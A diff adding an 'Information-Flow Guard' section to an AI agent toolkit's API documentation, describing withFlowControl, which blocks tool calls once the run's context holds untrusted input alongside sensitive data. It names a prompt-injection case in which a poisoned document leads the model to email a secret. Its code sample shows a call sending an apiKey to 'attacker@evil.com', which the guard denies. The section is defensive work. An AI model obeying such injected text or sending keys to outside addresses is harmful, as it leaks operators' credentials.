@@ -326,3 +326,42 @@ interface ToolExecutionResult<T = unknown> {
 | `Capability` | Sandbox capability: `'network'` \| `'fs:read'` \| `'fs:write'` \| `'subprocess'` \| scoped variants |
 | `SandboxConfig` | Sandbox config: `mode` (`'worker'` \| `'process'`), `handler`, `timeoutMs?`, `capabilities?`, `env?` |
 | `SandboxRunner` | Runner interface: `invoke`, `dispose` |
+
+---
+
+## Information-Flow Guard
+
+### withFlowControl
+
+```ts
+withFlowControl<TInput, TOutput>(tool: Tool<TInput, TOutput>, options: FlowGuardOptions): Tool<TInput, TOutput>
+```
+
+Gates a tool on the accumulated provenance of the context it runs in — the half [`withCapability`](#capability-guard) cannot cover.
+
+A capability token asks "may this agent call `send_email`?" and the answer is yes; it is a tool the agent is meant to use. This asks a different question: given everything that has entered the context by now, may data reach that destination at all? When a poisoned document convinces the model to call `send_email` with a secret in the body, the capability check passes and this one does not.
+
+**Options:**
+
+| Field | Type | Description |
+|---|---|---|
+| `tracker` | `FlowTracker` | Required. The per-run provenance accumulator |
+| `sink` | `string` | Sink identity. Defaults to `tool:<name>`. Set to `network:api.stripe.com` to let one rule govern every tool reaching that host |
+| `outputClasses` | `readonly string[]` | Classes this tool's output carries — a tool reading customer records should declare `['pii']` |
+| `outputOrigin` | `Origin` | Trust level of the output. Defaults to `'untrusted'`: a tool result is data from outside the operator's control, even when the tool itself is trusted |
+| `onDeny` | `(decision: FlowDecision) => void` | Called on denial |
+
+```ts
+import { createFlowPolicy, createFlowTracker, lethalTrifectaRule } from '@elsium-ai/core'
+import { withFlowControl } from '@elsium-ai/tools'
+
+const tracker = createFlowTracker({ policy: createFlowPolicy([lethalTrifectaRule()]) })
+const guarded = withFlowControl(sendEmail, { tracker })
+
+const result = await guarded.execute({ to: 'attacker@evil.com', body: apiKey })
+// { success: false, error: 'Flow denied: context holds sensitive data alongside…' }
+```
+
+Denial returns an unsuccessful `ToolExecutionResult` rather than throwing, matching `withCapability` — the agent loop sees a failed tool call and carries on, so a blocked exfiltration attempt does not crash the run. The handler never executes, so the side effect never happens.
+
+On success the tool's output is recorded into the tracker before anything downstream can read it.
